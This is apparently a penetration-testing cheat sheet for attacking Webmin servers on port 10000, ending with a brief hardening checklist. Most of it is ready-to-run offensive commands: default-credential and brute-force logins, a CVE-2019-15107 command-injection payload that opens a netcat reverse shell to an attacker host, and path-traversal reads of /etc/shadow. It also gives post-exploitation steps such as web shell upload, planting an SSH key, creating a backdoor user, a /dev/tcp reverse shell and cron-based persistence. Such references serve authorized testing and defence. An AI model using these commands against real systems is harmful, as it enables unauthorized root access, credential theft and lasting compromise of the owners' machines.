# WEBMIN ENUMERATION (Port 10000)

## SERVICE OVERVIEW
```
Webmin is a web-based system administration tool for Unix/Linux
- Default port: 10000 (HTTPS)
- Root-level system administration
- Manages users, services, packages, files
- Often runs as root
- Multiple known vulnerabilities
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p10000 <IP>                            # Service/Version detection
curl -k -I https://<IP>:10000                    # HTTPS headers
curl -k https://<IP>:10000 | grep -i webmin      # Version in HTML
openssl s_client -connect <IP>:10000             # SSL connection
```

## WEBMIN DETECTION
```bash
# Detect Webmin
curl -k https://<IP>:10000 | grep -i "webmin\|miniserv"
curl -k -I https://<IP>:10000 | grep -i "miniserv\|webmin"

# Webmin login page
curl -k https://<IP>:10000/session_login.cgi

# Version detection
curl -k https://<IP>:10000 | grep -oP 'version [0-9]+\.[0-9]+'
nmap -p10000 -sV <IP> | grep -i webmin
```

## SSL/TLS ENUMERATION
```bash
# SSL certificate info
openssl s_client -connect <IP>:10000 2>/dev/null | openssl x509 -noout -text
nmap -p10000 --script ssl-cert <IP>

# SSL/TLS security testing
testssl.sh https://<IP>:10000
sslscan <IP>:10000
nmap --script ssl-enum-ciphers -p10000 <IP>
```

## DEFAULT CREDENTIALS
```bash
# Common Webmin default credentials
root:password
root:admin
admin:admin
root:root
admin:password

# Test login
curl -k -d "user=root&pass=password" https://<IP>:10000/session_login.cgi
curl -k -d "user=admin&pass=admin" https://<IP>:10000/session_login.cgi
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l root -P passwords.txt -s 10000 <IP> https-form-post "/session_login.cgi:user=^USER^&pass=^PASS^:F=failed"
hydra -L users.txt -P passwords.txt -s 10000 <IP> https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:F=failed"

# Medusa
medusa -h <IP> -n 10000 -u root -P passwords.txt -M web-form -m FORM:"/session_login.cgi" -m DENY-SIGNAL:"failed"

# Note: Webmin may have account lockout, use slow rate
hydra -l root -P passwords.txt -s 10000 -t 1 -w 3 <IP> https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:F=failed"
```

## VULNERABILITY SCANNING
```bash
# Search for Webmin exploits
searchsploit webmin
searchsploit miniserv
nmap -p10000 --script vuln <IP>

# Common Webmin CVEs:
# CVE-2019-15107: RCE via password_change.cgi (Webmin <= 1.920)
# CVE-2019-15642: RCE in package updates
# CVE-2012-2982: Arbitrary file disclosure
# CVE-2006-3392: Arbitrary command execution
# CVE-2019-12840: RCE (authenticated)
# CVE-2020-35606: RCE (authenticated)
```

## WEBMIN RCE (CVE-2019-15107)
```bash
# Critical RCE vulnerability (Webmin <= 1.920)
# Unauthenticated command injection in password_change.cgi

# Test for vulnerability
curl -k "https://<IP>:10000/password_change.cgi" -d "user=root&pam=&expired=2&old=test|id&new1=test&new2=test"

# Metasploit module
msfconsole
use exploit/linux/http/webmin_backdoor          # CVE-2019-15107
set RHOSTS <IP>
set RPORT 10000
set SSL true
set LHOST <attacker_IP>
check
exploit

# Manual exploitation
curl -k "https://<IP>:10000/password_change.cgi" -d "user=root&pam=&expired=2&old=test|nc%20-e%20/bin/bash%20<attacker_IP>%204444&new1=test&new2=test"

# Python exploit
git clone https://github.com/rapid7/metasploit-framework
# Or search for standalone exploits:
searchsploit -m linux/remote/47230.py
python 47230.py <IP>
```

## AUTHENTICATED RCE (CVE-2020-35606)
```bash
# After authentication, RCE via package updates

# Metasploit
msfconsole
use exploit/linux/http/webmin_package_updates_rce  # CVE-2020-35606
set RHOSTS <IP>
set RPORT 10000
set SSL true
set USERNAME root
set PASSWORD password
set LHOST <attacker_IP>
exploit
```

## DIRECTORY/FILE ENUMERATION
```bash
# Common Webmin paths
curl -k https://<IP>:10000/
curl -k https://<IP>:10000/session_login.cgi     # Login page
curl -k https://<IP>:10000/miniserv.conf         # Config file (may be readable)
curl -k https://<IP>:10000/config               # Config directory

# File disclosure paths (old versions)
curl -k https://<IP>:10000/unauthenticated/..%01/..%01/..%01/..%01/etc/passwd
curl -k https://<IP>:10000/..%00/..%00/..%00/etc/shadow
```

## SESSION HIJACKING
```bash
# Webmin uses session cookies
# Cookie format: sid=<session_id>

# Capture valid session
# Then reuse:
curl -k -b "sid=VALID_SESSION_ID" https://<IP>:10000/

# Session fixation attempts
curl -k -b "sid=custom_session" https://<IP>:10000/session_login.cgi
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/webmin_login          # Login scanner
use exploit/linux/http/webmin_backdoor           # CVE-2019-15107
use exploit/unix/webapp/webmin_show_cgi_exec     # Authenticated RCE
use exploit/linux/http/webmin_package_updates_rce # CVE-2020-35606
use exploit/unix/webapp/webmin_upload_exec       # File upload RCE
set RHOSTS <IP>
set RPORT 10000
set SSL true
run
```

## INFORMATION DISCLOSURE
```bash
# Check for information leakage
curl -k https://<IP>:10000/error.html            # Error page
curl -k https://<IP>:10000/miniserv.log          # Log file (if accessible)

# Version in HTML source
curl -k https://<IP>:10000 | grep -i "version\|webmin"

# Server header
curl -k -I https://<IP>:10000 | grep -i server
# Often shows: MiniServ/1.xxx
```

## WEBMIN MODULES
```bash
# After successful login, Webmin has many modules:
# - System -> Users and Groups
# - System -> Change Passwords
# - Tools -> Command Shell
# - Tools -> Upload and Download
# - Servers -> Apache Webserver
# - Servers -> MySQL Database Server

# Direct RCE via Command Shell module
# Navigate to: https://<IP>:10000/shell/
# Execute commands directly!
```

## POST-EXPLOITATION (After Login)
```bash
# Access command shell
curl -k -b "sid=SESSION" "https://<IP>:10000/shell/" -d "cmd=whoami"

# Change root password
curl -k -b "sid=SESSION" "https://<IP>:10000/changepass/index.cgi" -d "user=root&old=&new=newpassword&new2=newpassword"

# Upload web shell
curl -k -b "sid=SESSION" -F "file=@shell.php" "https://<IP>:10000/upload.cgi?path=/var/www/html/"

# Add SSH key
curl -k -b "sid=SESSION" -d "cmd=echo 'ssh_public_key' >> /root/.ssh/authorized_keys" "https://<IP>:10000/shell/"

# Create new user
curl -k -b "sid=SESSION" -d "cmd=useradd -m backdoor && echo 'backdoor:password' | chpasswd" "https://<IP>:10000/shell/"
```

## CONFIGURATION FILES
```bash
# Webmin configuration files
/etc/webmin/miniserv.conf                        # Main config
/etc/webmin/miniserv.users                       # User list
/etc/webmin/webmin.acl                           # Access control
/etc/webmin/config                               # General config
/var/log/webmin/miniserv.log                     # Access log
/var/log/webmin/miniserv.error                   # Error log

# Read config (if you have file access)
cat /etc/webmin/miniserv.conf | grep -E "root\|pass\|allow"
cat /etc/webmin/miniserv.users                   # Hashed passwords
```

## PASSWORD HASH CRACKING
```bash
# If you can read /etc/webmin/miniserv.users
# Format: username:MD5_hash

# Extract hash
cat miniserv.users | cut -d: -f2

# Crack with John
john --format=raw-md5 --wordlist=rockyou.txt miniserv.users

# Crack with hashcat
hashcat -m 0 -a 0 miniserv.users rockyou.txt     # MD5
```

## COMMON MISCONFIGURATIONS
```
☐ Accessible from internet                      # Should be internal only
☐ Default credentials                            # root:password, admin:admin
☐ Outdated version                               # Known vulnerabilities
☐ Self-signed certificate                       # MitM possible
☐ Weak SSL/TLS configuration                     # Cryptographic attacks
☐ No IP restrictions                             # Anyone can access
☐ Running as root                                # Full system compromise
☐ No account lockout                             # Brute force possible
☐ Anonymous/guest access                         # Shouldn't exist
```

## QUICK WIN CHECKLIST
```
☐ Determine Webmin version
☐ Test default credentials (root:password)
☐ Check for CVE-2019-15107 (RCE, Webmin <= 1.920)
☐ Test for authenticated RCE
☐ Check SSL/TLS configuration
☐ Brute force with common passwords
☐ Check for file disclosure vulnerabilities
☐ Look for backup/config files
☐ Test session hijacking
☐ Search for version-specific exploits
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive Webmin scan
nmap -sV -p10000 --script "ssl-* and http-*" -oA webmin_enum <IP>

# Quick version check
curl -k https://<IP>:10000 | grep -oP 'Webmin [0-9]+\.[0-9]+'

# Test for backdoor (CVE-2019-15107)
curl -k "https://<IP>:10000/password_change.cgi" -d "user=root&pam=&expired=2&old=test|id&new1=test&new2=test"
```

## ADVANCED TECHNIQUES
```bash
# Webmin API exploitation
# Webmin has undocumented API endpoints

# Reverse shell via Command Shell module (authenticated)
# After login, navigate to Tools -> Command Shell
# Execute:
bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1

# Persistence via cron (authenticated)
# System -> Scheduled Cron Jobs
# Add job: */5 * * * * nc -e /bin/bash <attacker_IP> 4444

# Privilege escalation
# Webmin runs as root
# Any RCE = instant root shell!
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Runs as root - any RCE = root access
2. Multiple critical RCE vulnerabilities
3. Web-based administration = attack surface
4. Often exposed to internet
5. Default credentials common
6. Full system control if compromised
7. Can modify any system file
8. Can create users, change passwords
9. No sandboxing or isolation

RECOMMENDATION:
- Update Webmin to latest version
- Disable if not needed
- Restrict access to specific IPs
- Use strong authentication
- Enable 2FA if available
- Monitor access logs
- Run behind VPN
- Use SSH instead for system administration
```
